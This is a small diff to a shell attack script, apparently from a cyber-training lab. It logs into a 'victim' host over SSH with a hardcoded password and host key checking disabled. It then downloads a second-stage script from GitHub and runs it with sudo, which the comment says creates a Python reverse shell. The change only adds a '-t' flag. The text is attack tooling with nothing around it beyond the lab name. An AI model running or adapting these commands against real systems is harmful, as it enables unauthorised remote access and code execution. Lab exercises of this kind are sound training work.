@@ -17,5 +17,5 @@ sudo sshpass -p "password1" ssh -o StrictHostKeyChecking=no "user1@${victim_ip}"
 sleep 6
 
 #Create python rev shell file
-sudo sshpass -p "password1" ssh -o StrictHostKeyChecking=no "user1@${victim_ip}" 'wget "https://raw.githubusercontent.com/acebird/CyberforceLabs/refs/heads/main/Lab1attack_part2.sh"; sudo chmod +x Lab1attack_part2.sh; sudo ./Lab1attack_part2.sh'
+sudo sshpass -p "password1" ssh -t -o StrictHostKeyChecking=no "user1@${victim_ip}" 'wget "https://raw.githubusercontent.com/acebird/CyberforceLabs/refs/heads/main/Lab1attack_part2.sh"; sudo chmod +x Lab1attack_part2.sh; sudo ./Lab1attack_part2.sh'
 
